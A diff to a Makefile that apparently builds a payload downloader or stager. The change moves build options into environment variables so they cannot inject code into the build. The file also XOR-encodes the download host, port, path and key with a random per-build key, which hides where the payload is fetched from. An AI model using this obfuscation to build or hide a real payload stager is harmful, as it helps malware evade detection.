@@ -105,20 +105,25 @@ DOWNLOAD_HOST ?= 127.0.0.1
 DOWNLOAD_PORT ?= 8080
 DOWNLOAD_PATH ?= /payload
 DOWNLOAD_KEY ?= secret
+export DOWNLOAD_HOST DOWNLOAD_PORT DOWNLOAD_PATH DOWNLOAD_KEY
+export MODULE_PATH DOWNLOADER_MODULE_PATH
 # A non-empty PAYLOAD_FILE selects embedded local loading; empty downloads.
 PAYLOAD ?= $(if $(strip $(PAYLOAD_FILE)),local,download)
 PAYLOAD_FILE ?=
 MODULE_PATH ?= 
 # Generate random XOR key per build
 XOR_KEY_VALUE := $(shell python3 -c "import random; print(hex(random.randint(128, 255)))")
+export XOR_KEY_VALUE
 
-# XOR-encode config strings
-XOR_HOST := $(shell python3 -c "s='$(DOWNLOAD_HOST)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
-XOR_PORT := $(shell python3 -c "s='$(DOWNLOAD_PORT)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
-XOR_PATH := $(shell python3 -c "s='$(DOWNLOAD_PATH)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
-XOR_KEY := $(shell python3 -c "s='$(DOWNLOAD_KEY)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
-XOR_MODULE_PATH := $(shell python3 -c "s='$(MODULE_PATH)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
-XOR_LIB_PATH := $(shell python3 -c "s='$(DOWNLOADER_MODULE_PATH)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
+# XOR-encode config strings. Values are read from the environment, never
+# interpolated into the Python program, so a quote or shell metacharacter in a
+# build option cannot become code.
+XOR_HOST := $(shell python3 -c 'import os; s=os.environ.get("DOWNLOAD_HOST",""); k=int(os.environ["XOR_KEY_VALUE"],16); print(",".join(hex(ord(c)^k) for c in s)+",0x00" if s else "0x00")')
+XOR_PORT := $(shell python3 -c 'import os; s=os.environ.get("DOWNLOAD_PORT",""); k=int(os.environ["XOR_KEY_VALUE"],16); print(",".join(hex(ord(c)^k) for c in s)+",0x00" if s else "0x00")')
+XOR_PATH := $(shell python3 -c 'import os; s=os.environ.get("DOWNLOAD_PATH",""); k=int(os.environ["XOR_KEY_VALUE"],16); print(",".join(hex(ord(c)^k) for c in s)+",0x00" if s else "0x00")')
+XOR_KEY := $(shell python3 -c 'import os; s=os.environ.get("DOWNLOAD_KEY",""); k=int(os.environ["XOR_KEY_VALUE"],16); print(",".join(hex(ord(c)^k) for c in s)+",0x00" if s else "0x00")')
+XOR_MODULE_PATH := $(shell python3 -c 'import os; s=os.environ.get("MODULE_PATH",""); k=int(os.environ["XOR_KEY_VALUE"],16); print(",".join(hex(ord(c)^k) for c in s)+",0x00" if s else "0x00")')
+XOR_LIB_PATH := $(shell python3 -c 'import os; s=os.environ.get("DOWNLOADER_MODULE_PATH",""); k=int(os.environ["XOR_KEY_VALUE"],16); print(",".join(hex(ord(c)^k) for c in s)+",0x00" if s else "0x00")')
 
 # Transport selection: which transport_*.c to compile.
 # Built-in freestanding transports: http, tcp, udp (raw syscalls, no libc).
